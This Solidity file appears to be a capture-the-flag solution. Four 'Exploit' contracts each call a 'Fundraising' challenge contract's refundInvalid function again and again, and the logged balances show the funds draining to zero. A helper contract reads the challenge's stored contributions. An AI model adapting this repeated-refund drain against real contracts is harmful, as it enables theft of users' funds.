// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.9;

import "../console.sol";
import "./Fundraising.sol";

contract Exploit {
    Fundraising challenge;
    constructor(address payable _challenge) payable {
        challenge = Fundraising(_challenge);
    }

    function finalize() public { 
        console.log(challenge.getBalance() / 1 gwei);   // 1800
        challenge.refundInvalid(address(this)); 
        console.log(challenge.getBalance() / 1 gwei);   // 1000
        challenge.refundInvalid(address(this));        
        console.log(challenge.getBalance() / 1 gwei);    // 1600
        challenge.refundInvalid(address(this));        
        console.log(challenge.getBalance() / 1 gwei);    // 1400
        challenge.refundInvalid(address(this));         
        console.log(challenge.getBalance() / 1 gwei);   // 1300
    }

    fallback() external payable {}
}

contract Exploit2 {
    Fundraising challenge;
    constructor(address payable _challenge) payable {
        challenge = Fundraising(_challenge);
    }

    function finalize() public {
        console.log(challenge.getBalance() / 1 gwei); // 2100
        challenge.refundInvalid(address(this)); // 1300
        console.log(challenge.getBalance() / 1 gwei);
        challenge.refundInvalid(address(this)); // 900
        console.log(challenge.getBalance() / 1 gwei);
        challenge.refundInvalid(address(this)); // 700
        console.log(challenge.getBalance() / 1 gwei);
        challenge.refundInvalid(address(this)); // 600
        console.log(challenge.getBalance() / 1 gwei);
    }

    fallback() external payable {}
}

contract Exploit3 {
    Fundraising challenge;
    constructor(address payable _challenge) payable {
        challenge = Fundraising(_challenge);
    }

    function finalize() public {
        console.log(challenge.getBalance() / 1 gwei);
        challenge.refundInvalid(address(this)); // 1400
        console.log(challenge.getBalance() / 1 gwei);
        challenge.refundInvalid(address(this)); // 600
        console.log(challenge.getBalance() / 1 gwei);
        challenge.refundInvalid(address(this)); // 200
        console.log(challenge.getBalance() / 1 gwei);
        challenge.refundInvalid(address(this));      
        console.log(challenge.getBalance() / 1 gwei);                                          // 0
    }

    fallback() external payable {}
}

contract Exploit4 {
    Fundraising challenge;
    constructor(address payable _challenge) payable {
        challenge = Fundraising(_challenge);
    }

    function finalize() public {
        console.log(challenge.getBalance() / 1 gwei); // 2100
        challenge.refundInvalid(address(this)); // 1300
        console.log(challenge.getBalance() / 1 gwei);
        challenge.refundInvalid(address(this)); // 900
        console.log(challenge.getBalance() / 1 gwei);
        challenge.refundInvalid(address(this)); // 700
        console.log(challenge.getBalance() / 1 gwei);
        challenge.refundInvalid(address(this)); // 600
        console.log(challenge.getBalance() / 1 gwei);
    }

    fallback() external payable {}
}


contract See {

    struct Collaboration {
        uint256 amount;
        uint256 timestamp;
    }

    Fundraising challenge;
    constructor(address payable _challenge) payable {
        challenge = Fundraising(_challenge);
    }

    function lookCollaborations(address _looker) public view returns(uint) {
        (uint amount, ) = challenge.collaborations(_looker);
        return amount;
    }

    function lookBalance() public view returns(uint) {
        return challenge.getBalance();
    }
}
